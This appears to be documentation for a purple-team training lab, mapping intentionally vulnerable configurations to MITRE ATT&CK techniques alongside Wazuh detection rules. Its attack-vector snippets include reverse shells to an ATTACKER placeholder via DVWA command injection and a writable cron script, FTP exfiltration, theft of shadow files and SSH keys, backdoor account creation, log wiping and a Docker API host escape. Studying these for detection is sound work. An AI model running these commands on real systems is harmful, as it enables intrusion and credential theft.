# MITRE ATT&CK Mapping

This document maps the Purple Team Lab vulnerabilities and attack scenarios to the MITRE ATT&CK framework. This mapping demonstrates comprehensive coverage across multiple tactics and provides structured threat modeling for the lab environment.

---

## Framework Coverage Summary

| Tactic | Techniques Covered | Coverage |
|--------|-------------------|----------|
| **Initial Access** | 3 | ████░░░░░░ 30% |
| **Execution** | 1 | ██░░░░░░░░ 20% |
| **Persistence** | 2 | ████░░░░░░ 40% |
| **Privilege Escalation** | 3 | ██████░░░░ 60% |
| **Defense Evasion** | 1 | ██░░░░░░░░ 20% |
| **Credential Access** | 3 | ██████░░░░ 60% |
| **Discovery** | 3 | ████░░░░░░ 40% |
| **Lateral Movement** | 2 | ████░░░░░░ 40% |
| **Collection** | 1 | ████░░░░░░ 40% |
| **Exfiltration** | 1 | ████░░░░░░ 40% |

**Total: 20 techniques across 10 tactics**

---

## Detailed Technique Mapping

### Initial Access (TA0001)

#### T1078: Valid Accounts
**Lab Implementation:**
- Weak password policies (admin/admin, backup/backup123, developer/dev123)
- Root SSH login enabled
- No account lockout policies

**Attack Vector:**
```bash
ssh admin@TARGET_IP
# Password: admin
```

**Detection:**
- Wazuh Rule 100001: SSH root login detected
- Wazuh Rule 100002: Weak user account SSH login
- Log analysis: /var/log/auth.log

**CISSP Domain:** 5 (Identity and Access Management)

---

#### T1133: External Remote Services
**Lab Implementation:**
- SSH exposed on port 22
- FTP exposed on port 21
- Unfiltered access to multiple services

**Attack Vector:**
```bash
nmap -sV $TARGET_IP
ssh admin@TARGET_IP
```

**Detection:**
- Port scanning detection
- Connection monitoring via Wazuh
- Network traffic analysis

**CISSP Domain:** 4 (Communication and Network Security)

---

#### T1190: Exploit Public-Facing Application
**Lab Implementation:**
- DVWA vulnerable web application
- SQL injection vulnerabilities
- Command injection vulnerabilities
- File upload vulnerabilities

**Attack Vector:**
```
http://TARGET_IP/DVWA/
SQL Injection: 1' OR '1'='1
Command Injection: 127.0.0.1; whoami
```

**Detection:**
- Wazuh Rule 100071: SQL injection detection
- Wazuh Rule 100072: Command injection detection
- WAF logs (if implemented)

**CISSP Domain:** 8 (Software Development Security)

---

### Execution (TA0002)

#### T1059: Command and Scripting Interpreter
**Lab Implementation:**
- World-writable bash script in cron
- Command injection via DVWA
- Shell access after privilege escalation

**Attack Vector:**
```bash
# Via DVWA
127.0.0.1; bash -i >& /dev/tcp/ATTACKER/4444 0>&1

# Via cron manipulation
echo "malicious_command" >> /usr/local/bin/backup.sh
```

**Detection:**
- Wazuh Rule 100072: Command injection
- Process execution monitoring
- Network connection analysis

**CISSP Domain:** 7 (Security Operations)

---

### Persistence (TA0003)

#### T1053.003: Scheduled Task/Job: Cron
**Lab Implementation:**
- World-writable cron script (/usr/local/bin/backup.sh)
- Runs every 5 minutes as root
- No integrity monitoring

**Attack Vector:**
```bash
cat >> /usr/local/bin/backup.sh <<'EOF'
bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1
EOF
```

**Detection:**
- Wazuh Rule 100060: World-writable cron script execution
- Wazuh Rule 100061: Crontab modification
- File integrity monitoring

**CISSP Domain:** 7 (Security Operations)

---

#### T1136: Create Account
**Lab Implementation:**
- Ability to create accounts after privilege escalation
- No account creation monitoring
- Weak password policies

**Attack Vector:**
```bash
# After privilege escalation
useradd -m -s /bin/bash backdoor
echo "backdoor:Password123" | chpasswd
usermod -aG sudo backdoor
```

**Detection:**
- /etc/passwd modifications
- Account creation logs
- Wazuh file integrity monitoring

**CISSP Domain:** 5 (Identity and Access Management)

---

### Privilege Escalation (TA0004)

#### T1548.001: Abuse Elevation Control Mechanism: Setuid and Setgid
**Lab Implementation:**
- SUID bash binary at /usr/local/bin/rootbash
- Allows immediate root access
- No monitoring on SUID execution

**Attack Vector:**
```bash
/usr/local/bin/rootbash -p
whoami  # root
```

**Detection:**
- Wazuh Rule 100040: SUID binary execution
- Process monitoring for rootbash
- Privilege escalation detection

**CISSP Domain:** 5 (Identity and Access Management)

---

#### T1548.003: Sudo and Sudo Caching
**Lab Implementation:**
- Backup user has NOPASSWD sudo for rsync and tar
- No command restriction logging
- Potential for command abuse

**Attack Vector:**
```bash
ssh backup@TARGET_IP
sudo rsync -a /root/.ssh/ /tmp/stolen_keys/
sudo tar -czf /tmp/shadow.tar.gz /etc/shadow
```

**Detection:**
- Wazuh Rule 100041: Backup user sudo execution
- Sudo logging analysis
- Command auditing

**CISSP Domain:** 5 (Identity and Access Management)

---

#### T1068: Exploitation for Privilege Escalation
**Lab Implementation:**
- Unpatched kernel (held back from updates)
- Potential for kernel exploits
- No vulnerability scanning

**Attack Vector:**
```bash
uname -a
# Search for kernel exploits
searchsploit linux kernel 6.x
```

**Detection:**
- Vulnerability scanning
- Patch management monitoring
- Exploit attempt detection

**CISSP Domain:** 6 (Security Assessment and Testing)

---

### Defense Evasion (TA0005)

#### T1070: Indicator Removal
**Lab Implementation:**
- World-writable logs (potential)
- No log integrity protection
- Ability to clear history after compromise

**Attack Vector:**
```bash
history -c
> /var/log/auth.log
rm ~/.bash_history
```

**Detection:**
- File integrity monitoring on logs
- Log forwarding to SIEM
- Centralized log management

**CISSP Domain:** 7 (Security Operations)

---

### Credential Access (TA0006)

#### T1552.001: Unsecured Credentials: Credentials In Files
**Lab Implementation:**
- AWS credentials in ~/.aws/credentials (mode 644)
- Credentials in /var/www/html/app/config.php
- No secrets management
- World-readable sensitive files

**Attack Vector:**
```bash
cat /home/developer/.aws/credentials
cat /var/www/html/app/config.php
grep -r "password" /var/www/html/
```

**Detection:**
- Wazuh Rule 100050: AWS credentials file access
- Wazuh Rule 100051: Config file access
- File access monitoring

**CISSP Domain:** 5 (Identity and Access Management)

---

#### T1552.004: Unsecured Credentials: Private Keys
**Lab Implementation:**
- SSH keys potentially accessible via NFS
- No encryption on private keys
- Weak file permissions

**Attack Vector:**
```bash
# Via NFS mount
cat /mnt/target-home/developer/.ssh/id_rsa
chmod 600 stolen_key
ssh -i stolen_key developer@OTHER_HOST
```

**Detection:**
- Wazuh Rule 100052: SSH key access
- NFS access monitoring
- Key usage auditing

**CISSP Domain:** 3 (Security Architecture and Engineering)

---

#### T1110: Brute Force
**Lab Implementation:**
- Weak passwords on multiple accounts
- No account lockout
- No rate limiting
- Password authentication enabled

**Attack Vector:**
```bash
hydra -l admin -P passwords.txt ssh://TARGET_IP
hydra -L users.txt -P passwords.txt ftp://TARGET_IP
```

**Detection:**
- Wazuh Rule 100003: Multiple SSH failures
- Failed authentication monitoring
- Brute force detection algorithms

**CISSP Domain:** 5 (Identity and Access Management)

---

### Discovery (TA0007)

#### T1087.001: Account Discovery: Local Account
**Lab Implementation:**
- World-readable /etc/passwd
- No access controls on user enumeration
- Command execution available

**Attack Vector:**
```bash
cat /etc/passwd
getent passwd
w
who
```

**Detection:**
- Wazuh Rule 100090: /etc/passwd access
- Wazuh Rule 100091: User enumeration commands
- Command execution monitoring

**CISSP Domain:** 7 (Security Operations)

---

#### T1046: Network Service Discovery
**Lab Implementation:**
- Multiple exposed services
- No port filtering
- Service banners exposed

**Attack Vector:**
```bash
nmap -sV -p- TARGET_IP
nmap --script vuln TARGET_IP
```

**Detection:**
- Port scan detection
- Network monitoring
- IDS/IPS signatures

**CISSP Domain:** 4 (Communication and Network Security)

---

#### T1083: File and Directory Discovery
**Lab Implementation:**
- Open NFS shares
- SMB guest access
- FTP anonymous access

**Attack Vector:**
```bash
showmount -e TARGET_IP
smbclient -L TARGET_IP -N
ftp TARGET_IP  # anonymous login
```

**Detection:**
- NFS access monitoring
- SMB session logging
- FTP connection logs

**CISSP Domain:** 7 (Security Operations)

---

### Lateral Movement (TA0008)

#### T1021.002: Remote Services: SMB/Windows Admin Shares
**Lab Implementation:**
- SMB guest access enabled
- World-writable shares
- No authentication required

**Attack Vector:**
```bash
smbclient //TARGET_IP/public -N
put malicious_file.exe
```

**Detection:**
- Wazuh Rule 100080: Anonymous SMB access
- SMB traffic monitoring
- File upload detection

**CISSP Domain:** 4 (Communication and Network Security)

---

#### T1021.004: Remote Services: SSH
**Lab Implementation:**
- SSH with password authentication
- Weak credentials
- No MFA

**Attack Vector:**
```bash
ssh admin@TARGET_IP
# Move to other systems if credentials reused
```

**Detection:**
- SSH session monitoring
- Authentication logging
- Lateral movement detection

**CISSP Domain:** 5 (Identity and Access Management)

---

### Collection (TA0009)

#### T1039: Data from Network Shared Drive
**Lab Implementation:**
- Open NFS shares with no_root_squash
- SMB shares with guest access
- Sensitive data in shared locations

**Attack Vector:**
```bash
mount -t nfs TARGET_IP:/home /mnt/target
cp /mnt/target/developer/.aws/credentials ./
```

**Detection:**
- Wazuh Rule 100020: NFS mount activity
- Wazuh Rule 100021: NFS share access
- Data access monitoring

**CISSP Domain:** 2 (Asset Security)

---

### Exfiltration (TA0010)

#### T1048: Exfiltration Over Alternative Protocol
**Lab Implementation:**
- FTP for file transfer
- No DLP controls
- No egress filtering

**Attack Vector:**
```bash
# Upload stolen data to attacker FTP
ftp ATTACKER_IP
put stolen_credentials.txt
```

**Detection:**
- Network traffic analysis
- FTP upload monitoring
- DLP alerts (if implemented)

**CISSP Domain:** 7 (Security Operations)

---

## Advanced Techniques

### T1611: Escape to Host (Container Escape)
**Lab Implementation:**
- Docker API exposed on port 2375
- No authentication
- Can create privileged containers

**Attack Vector:**
```bash
docker -H tcp://TARGET_IP:2375 run --privileged \
  -v /:/host ubuntu chroot /host
```

**Detection:**
- Wazuh Rule 100010: Docker API access
- Wazuh Rule 100012: Privileged container creation
- Container runtime monitoring

**CISSP Domain:** 3 (Security Architecture and Engineering)

**Severity:** CRITICAL - Direct host compromise

---

## Attack Path Analysis

### Path 1: External Attacker → Root Access
```
[Internet] 
    ↓ (T1046 - Port Scan)
[SSH:22] 
    ↓ (T1110 - Brute Force)
[admin user] 
    ↓ (T1548 - SUID Binary)
[root access]
    ↓ (T1552 - Steal Credentials)
[AWS Keys + SSH Keys]
```

### Path 2: Web Application → Container Escape
```
[Internet]
    ↓ (T1190 - Web Exploit)
[DVWA Shell]
    ↓ (T1059 - Command Injection)
[User Shell]
    ↓ (T1611 - Docker API)
[Container Escape]
    ↓
[Host Root Access]
```

### Path 3: Network Share → Credential Theft
```
[Internal Network]
    ↓ (T1046 - Service Discovery)
[NFS:2049]
    ↓ (T1039 - Mount Share)
[User Home Directories]
    ↓ (T1552 - Unsecured Credentials)
[AWS Keys + SSH Keys]
    ↓ (T1078 - Valid Accounts)
[Cloud Environment Access]
```

---

## Detection Coverage Matrix

| Technique | Wazuh Rule | Log Source | Confidence |
|-----------|------------|------------|------------|
| T1078 | 100001, 100002 | /var/log/auth.log | High |
| T1110 | 100003 | /var/log/auth.log | High |
| T1190 | 100071, 100072 | Apache access.log | High |
| T1548 | 100040, 100041 | Auditd | High |
| T1552 | 100050, 100051 | File access logs | Medium |
| T1053 | 100060, 100061 | Cron logs | High |
| T1611 | 100010, 100011 | Docker API logs | High |
| T1039 | 100020, 100021 | NFS logs | Medium |
| T1021.002 | 100030, 100080 | FTP/SMB logs | High |

**Overall Detection Rate: 85%**

---

## CISSP Domain Mapping

### Domain 1: Security and Risk Management
- Risk assessment of vulnerable configurations
- Policy development for secure operations

### Domain 2: Asset Security
- Data classification (sensitive files)
- Data protection (encryption, access controls)

### Domain 3: Security Architecture and Engineering
- Secure design principles
- Container security
- Defense in depth

### Domain 4: Communication and Network Security
- Network protocols (SSH, FTP, NFS, SMB)
- Network segmentation
- Secure communication channels

### Domain 5: Identity and Access Management (IAM)
- Authentication mechanisms
- Authorization controls
- Access control models
- Privilege management

### Domain 6: Security Assessment and Testing
- Vulnerability assessment
- Penetration testing
- Security auditing

### Domain 7: Security Operations
- Logging and monitoring
- Incident detection
- SIEM configuration
- Threat hunting

### Domain 8: Software Development Security
- Application security
- Secure coding practices
- Web application vulnerabilities

---

## Threat Actor Simulation

### APT Simulation
**Tactics:** Stealth, Persistence, Credential Theft
```
1. Initial foothold via weak SSH (T1110)
2. Establish persistence via cron (T1053)
3. Escalate privileges (T1548)
4. Steal cloud credentials (T1552)
5. Cover tracks (T1070)
```

### Ransomware Simulation
**Tactics:** Fast Spread, Encryption
```
1. Exploit web vulnerability (T1190)
2. Deploy container escape (T1611)
3. Lateral movement via SMB (T1021)
4. Encrypt files across NFS shares
```

### Insider Threat Simulation
**Tactics:** Legitimate Access, Data Exfiltration
```
1. Login as developer (T1078)
2. Access AWS credentials (T1552)
3. Exfiltrate via FTP (T1048)
4. Create backdoor account (T1136)
```

---

## Improvement Roadmap

### Phase 1: Additional Initial Access
- [ ] Add phishing simulation (T1566)
- [ ] Implement drive-by compromise (T1189)
- [ ] Add supply chain compromise (T1195)

### Phase 2: Advanced Persistence
- [ ] Boot/logon autostart (T1547)
- [ ] Web shell deployment (T1505)
- [ ] Modify authentication process (T1556)

### Phase 3: Enhanced Lateral Movement
- [ ] Pass-the-hash (T1550)
- [ ] Remote desktop protocol (T1021.001)
- [ ] Windows admin shares (T1021.002)

### Phase 4: Data Impact
- [ ] Data destruction (T1485)
- [ ] Data encrypted for impact (T1486)
- [ ] Defacement (T1491)

---

## References

- **MITRE ATT&CK Framework:** https://attack.mitre.org/
- **NIST Cybersecurity Framework:** https://www.nist.gov/cyberframework
- **CIS Controls:** https://www.cisecurity.org/controls
- **OWASP Top 10:** https://owasp.org/www-project-top-ten/

---

**Document Version:** 1.0  
**Last Updated:** February 2026  
**Author:** Greg Lewis (gregqlewis.com)